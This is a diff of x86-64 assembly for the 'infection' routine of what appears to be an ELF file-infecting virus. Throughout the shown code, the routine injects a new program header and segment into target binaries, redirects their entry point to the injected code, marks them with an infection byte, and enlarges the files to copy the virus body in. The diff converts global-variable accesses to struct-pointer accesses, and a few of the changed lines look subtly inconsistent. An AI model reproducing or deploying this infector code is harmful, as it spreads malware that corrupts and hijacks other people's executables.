@@ -1,10 +1,26 @@
 infection:
 	PUSH_ALLr
-	mov	BYTE [rel ispie], 0
-	mov BYTE [rel zero], 1
-	mov qword [rel p_offset], 0
-	mov qword [rel p_vaddr], 0
-	mov qword [rel p_paddr], 0
+
+	mov		rax, [rbp + 16]
+	add		rax, mydata.ispie
+	mov		BYTE [rax], 0
+
+	mov		rax, [rbp + 16]
+	add		rax, mydata.zero
+	mov		BYTE [rax], 1
+
+	mov		rax, [rbp + 16]
+	add		rax, mydata.p_offset
+	mov		qword [rax], 0
+
+	mov		rax, [rbp + 16]
+	add		rax, mydata.p_vaddr
+	mov		qword [rax], 0
+
+	mov		rax, [rbp + 16]
+	add		rax, mydata.p_paddr
+	mov		qword [rax], 0
+
 
 	mov r10, [r14 + ehdr.e_phoff]
 	movzx rcx, word [r14 + ehdr.e_phnum]
@@ -54,8 +70,12 @@ infection:
 	mov		eax, [rdi + 8]
 	test	eax, 134217728
 	je		.next_dyn
-	mov		BYTE [rel ispie], 1
 
+	push	rax
+	mov		rax, [rbp + 16]
+	add		rax, mydata.ispie
+	mov		BYTE [rax], 1
+	pop		rax
 
 .next_dyn:
 	add		rdi, 16
@@ -112,59 +132,89 @@ infection:
 	jnz .loop
 
 
-	cmp BYTE [rel dynm], 0
+	mov		rbx, [rbp + 16]
+	add		rbx, mydata.dynm
+	cmp BYTE [rbx], 0
 	je	.no_check_dynm
-	cmp BYTE [rel ispie], 0
+	mov		rbx, [rbp + 16]
+	add		rbx, mydata.ispie
+	cmp BYTE [rbx], 0
 	je	.return
 
 .no_check_dynm:
 	cmp r13, 1
 	je	.return
 
-	mov rax, [rel p_vaddr]
-	mov rdx, [rel p_offset]
+	mov		rax, [rbp + 16]
+	add		rax, mydata.p_vaddr
+	mov rax, [rax]
+	mov		rdx, [rbp + 16]
+	add		rdx, mydata.p_offset
+	mov rdx, [rdx]
 	call align_value
 
-	mov [rel p_vaddr], rax
-	mov [rel entry], rax
-	mov [rel p_paddr], rax
+	mov		rsi, [rbp + 16]
+	add		rsi, mydata.p_vaddr
+	mov		[rsi], rax
+	mov		rsi, [rbp + 16]
+	add		rsi, mydata.entry
+	mov		[rsi], rax
+	mov		rsi, [rbp + 16]
+	add		rsi, mydata.p_paddr
+	mov		[rsi], rax
 
 	lea rsi, [r14 + r11]
 
 	push rdi
 	push rcx
 	mov rdi, rsi
-	lea rsi, [rel new_programheader]
+	mov		rsi, [rbp + 16]
+	add		rsi, mydata.new_programheader
+	;lea rsi, [rel new_programheader]
 	mov rcx, 56
 	rep movsb
 	pop rcx
 	pop rdi
 
-	mov rax, [rel p_vaddr]
-	mov [r14 + ehdr.e_entry], rax
+	mov		rax, [rbp + 16]
+	add		rax, mydata.p_vaddr
+	mov		rax, [rax]
+	mov		[r14 + ehdr.e_entry], rax
 
 	mov byte [r14 + 0xa], 1
 
-	mov rax, [rel p_offset]
+	mov		rax, [rbp + 16]
+	add		rax, mydata.p_offset
+	mov rax, [rax]
 	add rax, WAR_SIZE_NO_BSS
-	cmp rax, [rel file_size]
+	mov		rsi, [rbp + 16]
+	add		rsi, mydata.p_offset
+	cmp rax, [rsi]
 	jbe .no_extend
 
 	mov rax, SYS_munmap
 	mov rdi, r14
-	mov rsi, [rel file_size]
+	mov		rsi, [rbp + 16]
+	add		rsi, mydata.p_vaddr
+	mov rsi, [rsi]
 	syscall
 
-	mov rax, SYS_ftruncate
 	mov rdi, r12
-	mov rsi, [rel p_offset]
-	add rsi, WAR_SIZE_NO_BSS
-	mov [rel file_size], rsi
+	mov		rsi, [rbp + 16]
+	add		rsi, mydata.p_offset
+	mov		rsi, [rsi]
+	add		rsi, WAR_SIZE_NO_BSS
+	mov		rax, [rbp + 16]
+	add		rax, mydata.file_size
+	mov		[rax], rsi
+	mov		rax, SYS_ftruncate
 	syscall
 
 	mov rax, SYS_mmap
 	xor rdi, rdi
-	mov rsi, [rel file_size]
+	mov		rsi, [rbp + 16]
+	add		rsi, mydata.file_size
+	mov rsi, [rsi]
 	mov rdx, PROT_READ | PROT_WRITE
 	mov r10, MAP_SHARED
 	mov r8, r12
@@ -225,7 +275,9 @@ infection:
 
 
 	mov rdi, r14
-	add rdi, [rel p_offset]
+	mov		rax, [rbp + 16]
+	add		rax, mydata.p_offset
+	add rdi, [rax]
 	mov rsi, rbx
 	mov rcx, WAR_SIZE_NO_BSS
 	rep movsb
@@ -241,15 +293,33 @@ infection:
 
 	mov rax, SYS_munmap
 	mov rdi, r14
-	mov rsi, [rel file_size]
+	mov		rsi, [rbp + 16]
+	add		rsi, mydata.file_size
+	mov rsi, [rsi]
 	syscall
 
 .return:
-	mov qword [rel entry], 0
-	mov qword [rel old_entry],  0
-	mov	qword [rel p_offset],  0
-	mov	qword [rel p_vaddr],  0
-	mov	qword [rel p_paddr],  0
+
+	mov		rax, [rbp + 16]
+	add		rax, mydata.entry
+	mov		qword [rax], 0
+
+	mov		rax, [rbp + 16]
+	add		rax, mydata.old_entry
+	mov		qword [rax], 0
+
+	mov		rax, [rbp + 16]
+	add		rax, mydata.p_offset
+	mov		qword [rax], 0
+
+	mov		rax, [rbp + 16]
+	add		rax, mydata.p_vaddr
+	mov		qword [rax], 0
+
+	mov		rax, [rbp + 16]
+	add		rax, mydata.p_paddr
+	mov		qword [rax], 0
+
 	mov rax, r13
 	POP_ALLr
 	ret
